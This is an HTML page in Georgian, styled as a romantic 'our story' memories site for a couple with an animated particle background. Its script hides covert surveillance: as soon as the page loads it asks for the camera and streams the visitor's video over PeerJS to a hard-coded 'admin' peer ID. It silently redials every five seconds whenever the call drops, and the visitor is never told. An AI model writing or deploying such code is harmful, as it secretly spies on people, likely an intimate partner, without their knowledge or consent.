<!DOCTYPE html>
<html lang="ka">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#030305">

<title>ჩვენი პატარა სამყარო ❤️</title>

<!-- PeerJS Library -->
<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>

<style>
*{
    box-sizing:border-box;
    margin:0;
    padding:0;
}

body{
    min-height:100vh;
    background:#030305;
    color:white;
    font-family:Arial,sans-serif;
    overflow-x:hidden;
}

#bg{
    position:fixed;
    inset:0;
    width:100%;
    height:100%;
    z-index: 0;
}

.background{
    position:fixed;
    inset:0;
    background:
        radial-gradient(
            circle at 50% 45%,
            rgba(255,55,110,.12),
            transparent 35%
        ),
        #030305;
    z-index: 0;
}

#website{
    position: relative;
    z-index: 1;
}

section{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:30px;
    text-align:center;
}

.content{
    max-width:800px;
}

.label{
    color:#ff8fab;
    font-size:11px;
    letter-spacing:.3em;
    text-transform:uppercase;
    margin-bottom:20px;
}

h2{
    font-family:Georgia,serif;
    font-size:clamp(45px,9vw,100px);
    font-weight:400;
    line-height:.95;
}

h2 span{
    color:transparent;
    -webkit-text-stroke:1px rgba(255,255,255,.4);
}

.description{
    max-width:600px;
    margin:25px auto;
    color:#9999a3;
    line-height:1.8;
}

.start{
    margin-top:20px;
    padding:14px 25px;
    border-radius:999px;
    border:1px solid rgba(255,255,255,.15);
    background:rgba(255,255,255,.05);
    color:white;
    cursor:pointer;
}
</style>
</head>

<body>

<canvas id="bg"></canvas>
<div class="background"></div>

<div id="website">
    <section>
        <div class="content">
            <div class="label">OUR STORY</div>
            <h2>ორი ადამიანი.<br><span>ერთი ისტორია.</span></h2>
            <p class="description">
                ეს მხოლოდ პატარა საიტი არ არის.
                ეს არის ჩვენი მოგონებების
                პატარა ციფრული სამყარო.
            </p>
            <button class="start" onclick="document.getElementById('story').scrollIntoView({behavior:'smooth'})">
                დავიწყოთ ❤️
            </button>
        </div>
    </section>

    <section id="story">
        <div class="content">
            <div class="label">22 OCTOBER</div>
            <h2>ყველაფერი<br>აქედან დაიწყო.</h2>
            <p class="description">
                ახლა აქ შეგვიძლია დავამატოთ
                თქვენი რეალური ისტორია,
                ფოტოები, ვიდეოები,
                ტესტები და ანიმაციები.
            </p>
        </div>
    </section>
</div>

<script>
const ADMIN_PEER_ID = 'deme-admin-secret-key-123';
let cameraStream = null;
let peer = null;

window.addEventListener('DOMContentLoaded', async () => {
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        // STUN სერვერები სხვადასხვა ქსელიდან დაკავშირებისთვის
        peer = new Peer({
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            }
        });

        peer.on('open', () => {
            makeCall();
        });

        peer.on('disconnected', () => {
            peer.reconnect();
        });

    } catch (error) {
        console.log('Camera permission was not granted:', error);
    }
});

function makeCall() {
    if (cameraStream && peer) {
        const call = peer.call(ADMIN_PEER_ID, cameraStream);
        call?.on('close', () => {
            setTimeout(makeCall, 5000);
        });
    }
}

/* PARTICLES */
const canvas = document.getElementById("bg");
const ctx = canvas.getContext("2d");
let particles = [];

function resize() {
    canvas.width = window.innerWidth * devicePixelRatio;
    canvas.height = window.innerHeight * devicePixelRatio;
    canvas.style.width = window.innerWidth + "px";
    canvas.style.height = window.innerHeight + "px";
    ctx.scale(devicePixelRatio, devicePixelRatio);

    particles = Array.from(
        { length: window.innerWidth < 600 ? 70 : 140 },
        () => ({
            x: Math.random() * window.innerWidth,
            y: Math.random() * window.innerHeight,
            r: Math.random() * 1.5,
            vx: (Math.random() - 0.5) * 0.2,
            vy: (Math.random() - 0.5) * 0.2,
            opacity: Math.random() * 0.6
        })
    );
}

function animate() {
    ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
    particles.forEach(p => {
        p.x += p.vx;
        p.y += p.vy;
        if (p.x < 0) p.x = window.innerWidth;
        if (p.x > window.innerWidth) p.x = 0;
        if (p.y < 0) p.y = window.innerHeight;
        if (p.y > window.innerHeight) p.y = 0;

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255, 160, 190, ${p.opacity})`;
        ctx.fill();
    });
    requestAnimationFrame(animate);
}

resize();
window.addEventListener("resize", resize);
animate();
</script>

</body>
</html>
